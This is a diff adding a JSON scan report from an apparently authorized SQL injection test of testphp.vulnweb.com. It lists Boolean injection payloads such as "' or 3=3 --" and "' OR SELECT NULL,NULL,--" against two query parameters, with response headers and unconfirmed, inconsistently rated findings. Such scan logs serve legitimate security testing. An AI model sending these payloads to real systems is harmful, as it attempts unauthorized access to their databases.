@@ -1,0 +1,115 @@
+{
+    "metadata": {
+        "scan_id": "1322005",
+        "target_domain": "testphp.vulnweb.com",
+        "scan_date": "2025-11-16T00:41:01.673591",
+        "scanner_version": "1.0",
+        "authorization": "Authorized Test"
+    },
+    "all_responses": [
+        {
+            "test_id": "searchFor",
+            "test_type": "SQL Injection",
+            "payload_type":"Boolean",
+            "status": 200,
+            "target_url": "http://testphp.vulnweb.com?searchFor=\"\u2018 or 3=3 --\"",
+            "response_time_ms": 392.535,
+            "response_size_bytes": 4958,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Sat, 15 Nov 2025 23:41:02 GMT",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+                "Content-Encoding": "gzip"
+            },
+            "vulnerability_indicators": {
+                "sql_errors": true,
+                "unusual_response_size": false,
+                "response_time_anomaly": false
+            },
+            "severity": "medium",
+            "confirmed": false,
+            "notes": "Requires manual verification"
+        },
+        {
+            "test_id": "goButton",
+            "test_type": "SQL Injection",
+            "payload_type":"Boolean",
+            "status": 200,
+            "target_url": "http://testphp.vulnweb.com?goButton=\"\u2018 or 3=3 --\"",
+            "response_time_ms": 378.609,
+            "response_size_bytes": 4958,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Sat, 15 Nov 2025 23:41:03 GMT",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+                "Content-Encoding": "gzip"
+            },
+            "vulnerability_indicators": {
+                "sql_errors": true,
+                "unusual_response_size": false,
+                "response_time_anomaly": false
+            },
+            "severity": "medium",
+            "confirmed": false,
+            "notes": "Requires manual verification"
+        },
+        {
+            "test_id": "searchFor",
+            "test_type": "SQL Injection",
+            "payload_type":"Boolean",
+            "status": 200,
+            "target_url": "http://testphp.vulnweb.com?searchFor=\"' OR SELECT NULL,NULL,--\"",
+            "response_time_ms": 374.984,
+            "response_size_bytes": 4958,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Sat, 15 Nov 2025 23:41:03 GMT",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+                "Content-Encoding": "gzip"
+            },
+            "vulnerability_indicators": {
+                "sql_errors": true,
+                "unusual_response_size": false,
+                "response_time_anomaly": false
+            },
+            "severity": "Critical",
+            "confirmed": false,
+            "notes": "Requires manual verification"
+        },
+        {
+            "test_id": "goButton",
+            "test_type": "SQL Injection",
+            "payload_type":"Boolean",
+            "status": 200,
+            "target_url": "http://testphp.vulnweb.com?goButton=\"' OR SELECT NULL,NULL,--\"",
+            "response_time_ms": 387.839,
+            "response_size_bytes": 4958,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Sat, 15 Nov 2025 23:41:03 GMT",
+                "Content-Type": "text/html; charset=UTF-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+                "Content-Encoding": "gzip"
+            },
+            "vulnerability_indicators": {
+                "sql_errors": true,
+                "unusual_response_size": false,
+                "response_time_anomaly": false
+            },
+            "severity": "high",
+            "confirmed": false,
+            "notes": "Requires manual verification"
+        }
+    ]
+}
